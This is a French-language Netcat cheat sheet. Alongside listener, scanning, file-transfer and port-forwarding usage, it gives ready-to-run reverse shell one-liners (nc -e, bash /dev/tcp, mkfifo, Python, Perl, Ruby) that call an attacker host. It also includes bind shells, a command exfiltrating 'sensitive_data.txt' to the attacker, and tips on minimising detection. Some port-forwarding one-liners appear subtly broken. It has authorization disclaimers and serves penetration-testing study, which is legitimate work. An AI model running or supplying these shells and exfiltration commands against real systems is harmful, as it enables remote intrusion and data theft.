# Netcat Cheat Sheet

## Overview

Netcat (nc) est un outil de réseautage polyvalent utilisé pour :

- Créer des reverse et bind shells.
- Le scanning et l'énumération de ports.
- Les transferts de fichiers.
- Le transfert de ports et le pivoting.
- Le débogage et le test de réseaux.
- Réaliser des évaluations de sécurité autorisées.

Netcat fournit :

- Des connexions TCP/UDP simples.
- Des modes d'écoute et de connexion.
- Des capacités de transfert de fichiers.
- Des fonctionnalités de scanning de ports.
- Un support pour le scripting et l'automatisation.

```text
Utilisez Netcat uniquement contre des systèmes que vous possédez ou pour lesquels vous avez une autorisation explicite de test.
```

---

# 1. Starting Netcat

## Syntaxe de base

```bash
nc [options] <host> <port>
```

## Afficher l'aide

```bash
nc -h
```

## Afficher la version

```bash
nc -V
```

## Variantes de Netcat

- `nc` - Netcat original
- `ncat` - Netcat de Nmap (version améliorée)
- `netcat` - Implémentation alternative

---

# 2. Listening Modes

## Écouter sur un port

```bash
nc -l -p <port>
```

Exemple :

```bash
nc -l -p 4444
```

## Écouter et maintenir l'écoute après déconnexion

```bash
nc -l -p <port> -k
```

Exemple :

```bash
nc -l -p 4444 -k
```

## Écouter avec sortie verbose

```bash
nc -l -p <port> -v
```

Exemple :

```bash
nc -l -p 4444 -v
```

## Écouter sur toutes les interfaces

```bash
nc -l -p <port> 0.0.0.0
```

Exemple :

```bash
nc -l -p 4444 0.0.0.0
```

## Écouter sur une interface spécifique

```bash
nc -l -p <port> -s <interface-ip>
```

Exemple :

```bash
nc -l -p 4444 -s 192.168.1.10
```

## Écouter avec UDP

```bash
nc -u -l -p <port>
```

Exemple :

```bash
nc -u -l -p 53
```

---

# 3. Connecting Modes

## Se connecter à un port

```bash
nc <host> <port>
```

Exemple :

```bash
nc 192.168.1.10 4444
```

## Se connecter avec sortie verbose

```bash
nc -v <host> <port>
```

Exemple :

```bash
nc -v 192.168.1.10 4444
```

## Se connecter avec sortie très verbose

```bash
nc -vv <host> <port>
```

Exemple :

```bash
nc -vv 192.168.1.10 4444
```

## Se connecter avec timeout

```bash
nc -w <seconds> <host> <port>
```

Exemple :

```bash
nc -w 5 192.168.1.10 4444
```

## Se connecter en utilisant UDP

```bash
nc -u <host> <port>
```

Exemple :

```bash
nc -u 192.168.1.10 53
```

## Se connecter en utilisant IPv6

```bash
nc -6 <host> <port>
```

Exemple :

```bash
nc -6 ::1 4444
```

---

# 4. Reverse Shells

## Reverse shell avec Netcat (Linux)

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
nc -e /bin/bash <attacker-ip> 4444
```

## Reverse shell avec Netcat et bash

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

## Reverse shell avec Netcat (Windows)

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
nc -e cmd.exe <attacker-ip> 4444
```

## Reverse shell avec Netcat et named pipe

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
mkfifo f; cat f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 >f
```

## Reverse shell avec Netcat et Python

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Reverse shell avec Netcat et Python3

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## Reverse shell avec Netcat et Perl

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
perl -e 'use Socket;$i="<attacker-ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

## Reverse shell avec Netcat et Ruby

**Sur la machine de l'attaquant :**

```bash
nc -l -p 4444
```

**Sur la machine cible :**

```bash
ruby -rsocket -e'f=TCPSocket.open("<attacker-ip>",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

---

# 5. Bind Shells

## Bind shell avec Netcat (Linux)

**Sur la machine cible :**

```bash
nc -l -p 4444 -e /bin/bash
```

**Sur la machine de l'attaquant :**

```bash
nc <target-ip> 4444
```

## Bind shell avec Netcat (Windows)

**Sur la machine cible :**

```bash
nc -l -p 4444 -e cmd.exe
```

**Sur la machine de l'attaquant :**

```bash
nc <target-ip> 4444
```

## Bind shell avec Netcat et bash

**Sur la machine cible :**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l -p 4444 >/tmp/f
```

**Sur la machine de l'attaquant :**

```bash
nc <target-ip> 4444
```

---

# 6. File Transfers

## Transférer un fichier de l'attaquant à la cible

**Sur la machine de l'attaquant (émetteur) :**

```bash
nc -l -p 4444 < file.txt
```

**Sur la machine cible (récepteur) :**

```bash
nc <attacker-ip> 4444 > file.txt
```

## Transférer un fichier de la cible à l'attaquant

**Sur la machine cible (émetteur) :**

```bash
nc <attacker-ip> 4444 < file.txt
```

**Sur la machine de l'attaquant (récepteur) :**

```bash
nc -l -p 4444 > file.txt
```

## Transférer un répertoire (tar + nc)

**Sur l'émetteur :**

```bash
tar czf - directory/ | nc -l -p 4444
```

**Sur le récepteur :**

```bash
nc <sender-ip> 4444 | tar xzf -
```

## Transférer un fichier avec progression

**Sur l'émetteur :**

```bash
nc -l -p 4444 < file.txt
```

**Sur le récepteur :**

```bash
nc -v <sender-ip> 4444 > file.txt
```

## Transfert de plusieurs fichiers

**Sur l'émetteur :**

```bash
tar czf - file1.txt file2.txt file3.txt | nc -l -p 4444
```

**Sur le récepteur :**

```bash
nc <sender-ip> 4444 | tar xzf -
```

---

# 7. Port Scanning

## Scan de ports de base

```bash
nc -v -z <host> <start-port>-<end-port>
```

Exemple :

```bash
nc -v -z 192.168.1.10 1-1000
```

## Scanner des ports spécifiques

```bash
nc -v -z <host> <port1> <port2> <port3>
```

Exemple :

```bash
nc -v -z 192.168.1.10 21 22 80 443
```

## Scanner avec timeout

```bash
nc -v -z -w <seconds> <host> <start-port>-<end-port>
```

Exemple :

```bash
nc -v -z -w 2 192.168.1.10 1-1000
```

## Scan de ports UDP

```bash
nc -u -v -z <host> <start-port>-<end-port>
```

Exemple :

```bash
nc -u -v -z 192.168.1.10 1-1000
```

## Scanner et sauvegarder la sortie

```bash
nc -v -z <host> <start-port>-<end-port> > scan_results.txt
```

Exemple :

```bash
nc -v -z 192.168.1.10 1-1000 > scan_results.txt
```

## Détection rapide de services

```bash
nc -v <host> <port>
```

Exemple :

```bash
nc -v 192.168.1.10 80
```

Puis tapez :

```bash
GET / HTTP/1.0
```

---

# 8. Port Forwarding

## Transfert de ports local

**Sur l'hôte intermédiaire :**

```bash
nc -l -p 8080 | nc <destination-host> 80 | nc -l -p 8080
```

## Transfert de ports distant

**Sur la machine de l'attaquant :**

```bash
nc -l -p 8080 | nc <target-host> 80
```

## Transfert de ports en chaîne

**Sur le premier saut :**

```bash
nc -l -p 8080 | nc <second-hop> 9090
```

**Sur le deuxième saut :**

```bash
nc -l -p 9090 | nc <final-host> 80
```

## Transfert de ports avec ncat

**Sur l'hôte intermédiaire :**

```bash
ncat -l -p 8080 -c "ncat <destination-host> 80"
```

## Transfert bidirectionnel

**Sur l'hôte intermédiaire :**

```bash
mkfifo f1 f2; nc -l -p 8080 0<f1 | nc <destination-host> 80 1>f1 & nc -l -p 8080 0<f2 | nc <destination-host> 80 1>f2
```

---

# 9. Advanced Options

## Exécuter une commande lors de la connexion

```bash
nc -l -p 4444 -e /bin/bash
```

Exemple :

```bash
nc -l -p 4444 -e /bin/bash
```

## Exécuter une commande après la connexion

```bash
nc -l -p 4444 -c "command"
```

Exemple :

```bash
nc -l -p 4444 -c "whoami"
```

## Utiliser un port source

```bash
nc -p <source-port> <host> <port>
```

Exemple :

```bash
nc -p 12345 192.168.1.10 4444
```

## Utiliser une IP source spécifique

```bash
nc -s <source-ip> <host> <port>
```

Exemple :

```bash
nc -s 192.168.1.10 192.168.1.20 4444
```

## Activer le débogage

```bash
nc -d <host> <port>
```

## Utiliser un proxy

```bash
nc -x <proxy-host>:<proxy-port> <host> <port>
```

Exemple :

```bash
nc -x 127.0.0.1:8080 192.168.1.10 4444
```

## Proxy avec authentification

```bash
nc -x <proxy-host>:<proxy-port> -X <auth-type> <host> <port>
```

Exemple :

```bash
nc -x 127.0.0.1:8080 -X 2 192.168.1.10 4444
```

---

# 10. Ncat Enhancements

## Ncat avec SSL

**Listener :**

```bash
ncat -l -p 4444 --ssl
```

**Client :**

```bash
ncat <host> 4444 --ssl
```

## Ncat avec authentification

**Listener :**

```bash
ncat -l -p 4444 --allow <ip>
```

Exemple :

```bash
ncat -l -p 4444 --allow 192.168.1.10
```

## Ncat avec plusieurs allows

```bash
ncat -l -p 4444 --allow 192.168.1.10 --allow 192.168.1.20
```

## Ncat avec deny

```bash
ncat -l -p 4444 --deny <ip>
```

Exemple :

```bash
ncat -l -p 4444 --deny 192.168.1.100
```

## Ncat avec proxy HTTP

```bash
ncat --proxy <proxy-host>:<proxy-port> <host> <port>
```

Exemple :

```bash
ncat --proxy 127.0.0.1:8080 192.168.1.10 4444
```

## Ncat avec proxy SOCKS

```bash
ncat --proxy-type socks4 --proxy <proxy-host>:<proxy-port> <host> <port>
```

Exemple :

```bash
ncat --proxy-type socks4 --proxy 127.0.0.1:9050 192.168.1.10 4444
```

## Ncat avec chat

**Listener :**

```bash
ncat -l -p 4444 --chat
```

**Client :**

```bash
ncat <host> 4444 --chat
```

---

# 11. Common Attack Scenarios

## Listener pour reverse shell

```bash
nc -l -p 4444
```

## Configuration de bind shell

```bash
nc -l -p 4444 -e /bin/bash
```

## Récepteur de fichiers

```bash
nc -l -p 4444 > received_file.txt
```

## Émetteur de fichiers

```bash
nc <target-ip> 4444 < file_to_send.txt
```

## Scan de ports

```bash
nc -v -z 192.168.1.10 1-1000
```

## Probe de services

```bash
nc -v 192.168.1.10 80
```

## Banner grabbing

```bash
nc 192.168.1.10 21
```

## Requête HTTP

```bash
nc 192.168.1.10 80
GET / HTTP/1.0
```

## Serveur de chat simple

```bash
nc -l -p 4444
```

## Exfiltration de données

```bash
nc <attacker-ip> 4444 < sensitive_data.txt
```

---

# 12. Practical Workflows

## Flux de travail de base de reverse shell

```text
1. Démarrer le listener netcat sur l'attaquant.
2. Exécuter le reverse shell sur la cible.
3. Interagir avec le shell.
4. Effectuer la post-exploitation.
5. Documenter les résultats.
```

## Exemple : Reverse shell Linux

```bash
# Attaquant
nc -l -p 4444

# Cible
nc -e /bin/bash <attacker-ip> 4444
```

## Exemple : Reverse shell Windows

```bash
# Attaquant
nc -l -p 4444

# Cible
nc -e cmd.exe <attacker-ip> 4444
```

## Exemple : Transfert de fichiers

```bash
# Récepteur
nc -l -p 4444 > file.txt

# Émetteur
nc <receiver-ip> 4444 < file.txt
```

## Exemple : Scan de ports

```bash
# Scan rapide
nc -v -z 192.168.1.10 21,22,80,443

# Scan complet
nc -v -z -w 2 192.168.1.10 1-1000
```

## Exemple : Banner grabbing

```bash
# Banner FTP
nc 192.168.1.10 21

# Banner HTTP
nc 192.168.1.10 80
GET / HTTP/1.0

# Banner SSH
nc 192.168.1.10 22
```

## Exemple : Transfert de ports

```bash
# Transfert simple
nc -l -p 8080 | nc <destination> 80

# Avec ncat
ncat -l -p 8080 -c "ncat <destination> 80"
```

---

# 13. Common Commands Reference

| Command | Description |
|---|---|
| `nc -h` | Afficher l'aide |
| `nc -V` | Afficher la version |
| `nc -l -p <port>` | Écouter sur un port |
| `nc -l -p <port> -k` | Écouter et maintenir l'écoute |
| `nc -l -p <port> -e <cmd>` | Exécuter une commande lors de la connexion |
| `nc <host> <port>` | Se connecter à host:port |
| `nc -v <host> <port>` | Se connecter avec sortie verbose |
| `nc -v -z <host> <port>` | Scanner un port |
| `nc -u <host> <port>` | Utiliser UDP |
| `nc -w <seconds> <host> <port>` | Définir le timeout |
| `nc -s <ip> <host> <port>` | Utiliser l'IP source |
| `nc -p <port> <host> <port>` | Utiliser le port source |
| `nc -e <cmd> <host> <port>` | Exécuter une commande |
| `nc -x <proxy> <host> <port>` | Utiliser un proxy |
| `ncat --ssl <host> <port>` | Utiliser SSL |
| `ncat --chat <host> <port>` | Mode chat |
| `ncat --allow <ip>` | Autoriser une IP spécifique |
| `ncat --deny <ip>` | Refuser une IP spécifique |

---

# 14. Troubleshooting

## Connection refused

- Vérifiez si le listener est en cours d'exécution.
- Vérifiez que le port n'est pas bloqué par le firewall.
- Assurez-vous que l'adresse IP est correcte.
- Vérifiez si le service est en écoute.

## Timeout de connexion

- Augmentez le timeout avec `-w`.
- Vérifiez la connectivité réseau.
- Assurez-vous que la cible est accessible.
- Vérifiez les règles du firewall.

## Aucune donnée reçue

- Vérifiez la syntaxe de la commande.
- Assurez-vous que la commande s'est exécutée correctement.
- Vérifiez les permissions appropriées.
- Vérifiez le chemin réseau.

## Permission denied

- Exécutez avec les privilèges appropriés.
- Vérifiez si le port nécessite root (>1024).
- Vérifiez les politiques SELinux/AppArmor.
- Utilisez des ports non privilégiés.

## Transfert lent

- Vérifiez la bande passante réseau.
- Vérifiez la congestion réseau.
- Utilisez la compression si disponible.
- Vérifiez la perte de paquets.

---

# 15. Security Best Practices

## Vérifiez toujours les connexions

- Confirmez que vous vous connectez au bon hôte.
- Vérifiez les numéros de port.
- Vérifiez les attaques man-in-the-middle.
- Utilisez le chiffrement quand c'est possible.

## Minimisez la détection

- Utilisez des ports non standard.
- Évitez les scans bruyants.
- Utilisez un timing approprié.
- Nettoyez après les tests.

## Utilisez le chiffrement

- Utilisez ncat avec SSL quand disponible.
- Considérez les tunnels SSH pour les données sensibles.
- Évitez d'envoyer des credentials en clair.
- Utilisez un VPN pour plus de sécurité.

## Documentez tout

- Enregistrez toutes les commandes utilisées.
- Notez les détails de connexion.
- Suivez les transferts de données.
- Documentez les résultats et méthodes.

## Nettoyez après les tests

- Tuez les processus listener.
- Supprimez les fichiers temporaires.
- Fermez toutes les connexions.
- Vérifiez qu'aucun backdoor ne reste.

---

# 16. Important Reminders

- Obtenez toujours une autorisation explicite avant d'utiliser Netcat.
- Testez d'abord dans un environnement de laboratoire contrôlé.
- Certaines utilisations peuvent déclencher des alertes de sécurité.
- Respectez les limites et politiques réseau.
- Maintenez Netcat à jour régulièrement.
- Validez les résultats manuellement.
- Documentez toutes les actions et commandes.
- Préservez les preuves originales et les logs.
- Comprenez les implications légales et éthiques.
- Nettoyez après les tests.

---

# 17. Quick Reference Examples

## Démarrer un listener

```bash
nc -l -p 4444
```

## Se connecter au listener

```bash
nc 192.168.1.10 4444
```

## Reverse shell

```bash
nc -e /bin/bash 192.168.1.10 4444
```

## Bind shell

```bash
nc -l -p 4444 -e /bin/bash
```

## Transfert de fichiers

```bash
nc -l -p 4444 > file.txt
```

## Scan de ports

```bash
nc -v -z 192.168.1.10 1-1000
```

## Banner grabbing

```bash
nc 192.168.1.10 80
```

## Connexion UDP

```bash
nc -u 192.168.1.10 53
```

## Avec timeout

```bash
nc -w 5 192.168.1.10 4444
```

## Scan verbose

```bash
nc -vv -z 192.168.1.10 1-1000
```

## Ncat avec SSL

```bash
ncat --ssl 192.168.1.10 4444
```

---

# 18. Additional Resources

## Netcat Official

```text
http://netcat.sourceforge.net/
```

## Ncat (Nmap)

```text
https://nmap.org/ncat/
```

## Netcat Cheatsheet

```text
https://github.com/udayvir/netcat-cheatsheet
```

## TCP/IP Networking

```text
https://www.tcpipguide.com/
```

## Network Security

```text
https://www.sans.org/
```
